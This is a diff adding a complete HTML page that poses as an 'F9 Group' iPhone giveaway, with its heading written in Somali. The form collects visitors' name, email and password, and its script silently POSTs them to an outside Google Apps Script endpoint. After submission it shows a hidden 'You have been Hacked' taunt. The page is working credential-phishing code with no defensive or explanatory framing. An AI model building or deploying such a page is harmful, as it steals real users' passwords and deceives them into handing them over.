@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Form </title>
+
+  <style>
+    body {
+      background: #333;
+      width: 100%;
+    }
+    .right-contact {
+      width: 400px;
+      padding: 5% ;
+    }
+      .right-contact form {
+    width: 100%;
+    /* border: 1px solid #FFf; */
+    display: flex;
+    align-items: flex-start;
+    flex-direction: column;
+    gap: 20px;
+  }
+  .right-contact input {
+    padding: 10px;
+    width: 90%;
+    border: none;
+    background: rgb(66, 64, 64);
+    border-radius: 5px;
+    color: #fff;
+  }
+  
+  .right-contact input:focus {
+    outline: none;
+  }
+
+  .right-contact textarea {
+    padding: 5px;
+    width: 93%;
+    height: 150px;
+    border: none;
+    background: rgb(66, 64, 64);
+    color:#fff;
+  }
+  .right-contact textarea:focus {
+    outline: none;
+  }
+  .btn-footer {
+    padding: 8px 30px;
+    background: rgb(255, 60, 60);
+    color: #fff;
+    border-radius: 10px;
+    border: none;
+  }
+  .right-contact h2 {
+     color:#fff;
+     font-family: Arial, Helvetica, sans-serif;
+     letter-spacing: 1px;
+     text-align:start;
+     margin-bottom: 40px;
+  }
+
+  .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #333;
+            padding: 1rem;
+            width: 100%;
+  
+        }
+        .navbar-brand {
+            color: white;
+            text-decoration: none;
+            font-size: 1.5rem;
+            letter-spacing: 2px;
+
+        }
+        .navbar-links {
+            display: flex;
+            list-style: none;
+            padding: 0;
+        }
+        .navbar-links li {
+            margin: 0 1rem;
+        }
+        .navbar-links a {
+            color: white;
+            text-decoration: none;
+            padding: 0.5rem 1rem;
+        }
+        .navbar-links a:hover {
+            background-color: #575757;
+            border-radius: 4px;
+        }
+        .toggle-button {
+            display: none;
+            flex-direction: column;
+            cursor: pointer;
+        }
+        .toggle-button div {
+            width: 25px;
+            height: 3px;
+            background-color: white;
+            margin: 4px 0;
+        }
+        @media (max-width: 768px) {
+          .navbar-links {
+          display: none;
+          align-items: stretch;
+          flex-direction: column;
+          position: absolute;
+          row-gap: 20px;
+          padding-top: 20px;
+          padding: 20px 15px 10px 15px;
+          top: 10%;
+          background: #333;
+          right: -40px;
+          height: fit-content;
+          text-align: center;
+          width: 200px;
+      }
+  
+            .navbar-links.active {
+                display: flex;
+            }
+            .toggle-button {
+                display: flex;
+            }
+        }
+        .hacked {
+          margin: 10%;
+          display: none;
+        }
+
+        .hacked h2 {
+          color: #fff;
+
+        }
+        .hacked p {
+          color: #fff;
+          font-size: 1.2rem;
+        }
+
+  </style>
+</head>
+<body>
+
+  <nav class="navbar">
+    <a href="#" class="navbar-brand">F9 Group</a>
+    <div class="toggle-button" id="toggle-button">
+        <div></div>
+        <div></div>
+        <div></div>
+    </div>
+    <ul class="navbar-links" id="navbar-links">
+        <li><a href="#">Home</a></li>
+        <li><a href="#">About</a></li>
+        <li><a href="#">Services</a></li>
+        <li><a href="#">Contact</a></li>
+    </ul>
+</nav>
+
+  <div class="hacked">
+    <h2>You have been Hacked📵😂 </h2>
+    <p>Miskiin!!!</p>
+  </div>
+
+
+  <div class="right-contact">
+
+    <h2>Is Diiwan geli Si aad ugu guuleysato Iphone</h2>
+
+    <form  name="submit-to-google-sheet2">
+
+      <input type="text" name="name" placeholder="name"  required>
+      <input type="email" name="email" placeholder="email" required>
+      <input type="password" name="password" placeholder="password">
+      <textarea  name="message"  placeholder="maxaad rajeyneysaa"></textarea>
+      <button type="submit" class="btn-footer btn2">Submit</button>
+      <span class="success"></span>
+    </form>
+
+    <script>
+        const toggleButton = document.getElementById('toggle-button');
+        const navbarLinks = document.getElementById('navbar-links');
+
+        toggleButton.addEventListener('click', () => {
+            navbarLinks.classList.toggle('active');
+        });
+    </script>
+
+<script>
+
+  const right = document.querySelector('.right-contact');
+
+  const newt = document.querySelector('.hacked')
+  console.log(newt)
+
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbwT9ZRyZJBaECzAlUaa4VD95RFD0qD8EtankqvzciARRkATgK24y9sHACBP_xJMqEGo/exec'
+  const form = document.forms['submit-to-google-sheet2']
+
+  form.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response => {
+        right.innerHTML = '';
+        newt.style.display = 'block'
+      } 
+    )
+      .catch(error => console.error('Error!', error.message))
+  })
+</script>
+
+  
+</body>
+</html>
